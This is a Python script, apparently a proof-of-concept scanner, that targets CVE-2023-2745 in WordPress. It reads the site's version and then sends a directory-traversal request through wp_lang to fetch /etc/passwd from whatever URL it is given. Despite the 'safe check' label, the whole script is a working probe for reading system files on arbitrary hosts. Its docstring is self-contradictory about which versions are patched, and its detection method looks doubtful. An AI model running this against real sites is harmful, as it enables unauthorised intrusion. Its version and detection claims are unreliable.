#!/usr/bin/env python3
"""
Безопасная проверка CVE-2023-2745 (directory traversal в wp_lang)
WordPress ≤ 6.2.1 – patched, ≤ 6.2 – vulnerable.
Usage:
    python3 check_cve-2023-2745.py https://example.com
"""

import sys, requests, re
from urllib.parse import urljoin

TIMEOUT = 8
HEADERS = {"User-Agent": "CVE-2023-2745-checker/1.0"}

def wp_version(url):
    """Возвращает версию WP или None"""
    r = requests.get(urljoin(url, "/"), headers=HEADERS, timeout=TIMEOUT)
    # 1) meta generator
    m = re.search(r'<meta name="generator" content="WordPress (\d+\.\d+(?:\.\d+)?)"', r.text)
    if m:
        return m.group(1)
    # 2) headers
    if "X-Powered-By" in r.headers:
        m = re.search(r"WordPress/(\d+\.\d+(?:\.\d+)?)", r.headers["X-Powered-By"])
        if m:
            return m.group(1)
    return None

def check_traverse(url):
    """Пробуем подгрузить /etc/passwd (или любой существующий файл) через wp_lang"""
    probe = urljoin(url, "/wp-login.php?wp_lang=../../../../../../../../etc/passwd%00")
    try:
        r = requests.get(probe, headers=HEADERS, timeout=TIMEOUT, allow_redirects=False)
        if r.status_code == 200 and b"root:" in r.content:
            return True
    except requests.exceptions.RequestException:
        pass
    return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 check_cve-2023-2745.py https://site.com")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    print(f"[*] Цель: {target}")

    ver = wp_version(target)
    if not ver:
        print("[-] Версию WP определить не удалось — проверка продолжается")
    else:
        print(f"[*] Обнаружена WordPress {ver}")
        major, minor, *_ = map(int, (ver + ".0").split(".")[:2])
        if (major, minor) > (6, 2):
            print("[+] Версия выше 6.2 — уязвимость закрыта.")
            sys.exit(0)

    print("[*] Проверка directory traversal …")
    if check_traverse(target):
        print("[!] УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА: wp_lang=../ не фильтруется")
    else:
        print("[+] Признаков уязвимости НЕ обнаружено (либо файл недоступен, либо патч)")

if __name__ == "__main__":
    main()